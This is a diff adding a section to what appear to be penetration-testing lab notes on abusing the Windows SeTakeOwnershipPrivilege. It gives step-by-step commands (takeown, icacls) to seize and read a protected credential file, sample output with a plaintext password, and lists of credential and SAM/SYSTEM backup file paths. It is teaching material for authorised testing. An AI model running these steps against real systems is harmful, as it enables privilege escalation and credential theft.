@@ -984,3 +984,210 @@ Useful when:
 * GUI/RDP is not possible
 
 ---
+
+#  SeTakeOwnershipPrivilege 
+
+## 🔍 Overview
+
+**SeTakeOwnershipPrivilege** allows a user to take ownership of **any securable object** in Windows, including:
+
+* NTFS files & folders
+* Registry keys
+* Services
+* Processes
+* Printers
+* Active Directory objects
+
+Assigns **WRITE_OWNER** permission → user can change object ownership.
+
+**Default:** Administrators only.
+**Common cases:** Backup/service accounts running VSS snapshots or backup jobs may have this privilege along with:
+
+* SeBackupPrivilege
+* SeRestorePrivilege
+* SeSecurityPrivilege
+
+This privilege is **powerful and dangerous**; misuse can break applications or cause outages.
+
+
+## ⚠️ Why This Privilege Matters
+
+If an attacker gains access to an account with SeTakeOwnershipPrivilege, they can:
+
+* Take ownership of sensitive files
+* Modify ACLs
+* Read protected data (passwords, configs, secrets)
+* Potentially escalate privileges
+* Cause Denial-of-Service (DOS)
+* Achieve RCE in some cases
+
+Although uncommon for normal users, it is **very valuable during internal penetration tests**.
+
+
+## 📍 Location in Group Policy
+
+```
+Computer Configuration  
+└─ Windows Settings  
+   └─ Security Settings  
+      └─ Local Policies  
+         └─ User Rights Assignment  
+             → Take ownership of files or other objects
+```
+
+## 🧪 Privilege Review: Check Your Token
+
+```powershell
+whoami /priv
+```
+
+Example output (privilege present but **disabled**):
+
+```
+SeTakeOwnershipPrivilege      Take ownership of files or other objects      Disabled
+```
+
+
+## 🔓 Enabling SeTakeOwnershipPrivilege
+
+Import helper scripts:
+
+```powershell
+Import-Module .\Enable-Privilege.ps1
+.\EnableAllTokenPrivs.ps1
+whoami /priv
+```
+
+Now **Enabled**.
+
+
+## 🎯 Selecting a Target File
+
+In real AD environments, file shares are often misconfigured.
+Example path:
+
+```
+C:\Department Shares\Private\IT\cred.txt
+```
+
+Check metadata and ownership:
+
+```powershell
+Get-ChildItem 'C:\Department Shares\Private\IT\cred.txt' |
+Select FullName, LastWriteTime, Attributes, @{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}
+```
+
+If owner = blank or error → insufficient permissions.
+
+
+## 🧭 Check Directory Ownership (fallback)
+
+```powershell
+cmd /c dir /q "C:\Department Shares\Private\IT"
+```
+
+## 🛠️ Taking Ownership
+
+Use `takeown`:
+
+```powershell
+takeown /f 'C:\Department Shares\Private\IT\cred.txt'
+```
+
+Success example:
+
+```
+SUCCESS: The file ... is now owned by WINLPE-SRV01\htb-student
+```
+
+Confirm:
+
+```powershell
+Get-ChildItem 'C:\Department Shares\Private\IT\cred.txt' |
+Select Name, Directory, @{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}
+```
+
+
+## 🔐 Fixing ACLs to Allow Reading
+
+Ownership ≠ access.
+You must grant yourself permissions.
+
+Try reading first:
+
+```powershell
+cat "C:\Department Shares\Private\IT\cred.txt"
+```
+
+If Access Denied → modify ACL:
+
+```powershell
+icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F
+```
+
+Now read:
+
+```powershell
+cat 'C:\Department Shares\Private\IT\cred.txt'
+```
+
+Example sensitive output:
+
+```
+NIX01 admin
+root:n1X_p0wer_us3er!
+```
+
+## 🚨 Important Operational Notes
+
+* Taking ownership is **destructive** and may break applications
+* Always revert ownership & ACLs if possible
+* Document all changes in the final report
+* Avoid modifying critical system files (e.g., web.config, AD-sensitive paths)
+
+## 🔑 When to Use SeTakeOwnershipPrivilege?
+
+Use this technique when:
+
+### ✔️ No admin rights
+
+But you need access to a protected file.
+
+### ✔️ Other privilege escalation paths fail
+
+Backup/restore privilege abuse isn’t available
+SeDebug or kernel attacks don’t apply.
+
+### ✔️ The file share has sensitive files
+
+Explore:
+
+* `passwords.*`
+* `pass.*`
+* `creds.*`
+* `*.kdbx` (KeePass)
+* Scripts
+* Config files
+* VHD / VHDX
+* OneNote
+* SAM backup files
+
+
+## 📂 Local Files of Interest
+
+Examples that could store credentials:
+
+```
+c:\inetpub\wwwroot\web.config
+%WINDIR%\repair\sam
+%WINDIR%\repair\system
+%WINDIR%\repair\software
+%WINDIR%\repair\security
+%WINDIR%\system32\config\SecEvent.Evt
+%WINDIR%\system32\config\default.sav
+%WINDIR%\system32\config\security.sav
+%WINDIR%\system32\config\software.sav
+%WINDIR%\system32\config\system.sav
+```
+
+---
